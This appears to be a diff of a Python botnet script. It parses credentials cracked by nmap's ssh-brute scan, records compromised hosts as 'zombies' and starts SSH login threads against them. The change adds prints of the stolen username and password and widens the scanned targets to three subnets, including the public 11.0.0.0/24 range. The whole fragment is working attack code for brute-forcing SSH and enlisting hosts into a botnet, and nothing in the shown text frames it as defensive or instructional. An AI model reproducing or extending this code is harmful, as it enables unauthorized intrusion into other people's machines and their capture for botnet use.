@@ -62,7 +62,9 @@ def ssh(ip):
             ports = scanner_t2[ip]
             try:
                 data = ports['tcp'][22]['script']['ssh-brute']
+                print(data)
                 user, password = data.replace('\n', '').split('Accounts:')[1].split('-')[0].strip().split(':')
+                print(user, password)
                 zombies.write(ip + " " + user + " " + password + '\n')
                 t = Thread(target=sshLogin, args=(user, ip, password))
                 t.start()
@@ -118,8 +120,8 @@ def attack(q):
 
 
 if __name__ == '__main__':
-    b = BotNet.BotNet(networks=["10.1.0.0/24"])
-    network = ["10.1.0.0/24"]
+    b = BotNet.BotNet(networks=["10.1.0.0/24", "10.2.0.0/24", "11.0.0.0/24"])
+    network = ["10.1.0.0/24", "10.2.0.0/24", "11.0.0.0/24"]
 
     q = Queue()
     t1 = Thread(target=scan, args=(q, network))
